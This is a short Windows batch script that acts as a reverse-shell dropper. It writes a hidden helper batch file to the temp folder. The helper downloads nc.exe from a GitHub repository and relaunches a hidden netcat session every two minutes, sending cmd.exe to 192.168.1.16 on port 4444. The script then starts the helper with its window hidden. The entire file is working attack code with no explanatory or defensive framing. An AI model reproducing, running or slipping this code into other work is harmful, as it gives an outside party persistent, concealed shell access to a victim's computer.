@echo off
set "batFilePath=%temp%\pro.bat"
if not exist "%batFilePath%" (
    echo @echo off > "%batFilePath%"
    echo curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe >> "%batFilePath%"
    echo :loop >> "%batFilePath%"
    echo    powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden" >> "%batFilePath%"
    echo    timeout /t 120 >nul >> "%batFilePath%"
    echo goto loop >> "%batFilePath%"
)
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\pro.bat\" -WindowStyle Hidden"

